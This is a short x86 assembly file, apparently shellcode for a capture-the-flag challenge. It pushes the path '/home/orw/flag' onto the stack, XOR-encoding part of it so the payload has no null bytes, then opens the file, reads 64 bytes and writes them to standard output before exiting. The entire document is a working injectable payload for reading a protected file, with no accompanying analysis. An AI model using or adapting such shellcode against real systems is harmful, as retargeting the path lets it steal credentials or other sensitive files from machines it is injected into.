BITS 32
global _start

_start:
	jmp open

open:
	push 0x1010101
	xor dword [esp], 0x1016660
	push 0x6c662f77
	push 0x726f2f65
	push 0x6d6f682f
	mov ebx, esp
	push 0x05
	pop eax
	xor ecx, ecx
	xor edx, edx
	int 0x80
    
read:
	mov ebx, eax
	mov ecx, esp
	push 0x40
	pop edx
	push 0x03
	pop eax
	int 0x80

write:
	mov ecx, esp
	push 0x04
	pop eax
	push 0x01
	pop ebx
	push 0x40
	pop edx
	int 0x80

_exit:
	xor eax, eax
	inc eax
	int 0x80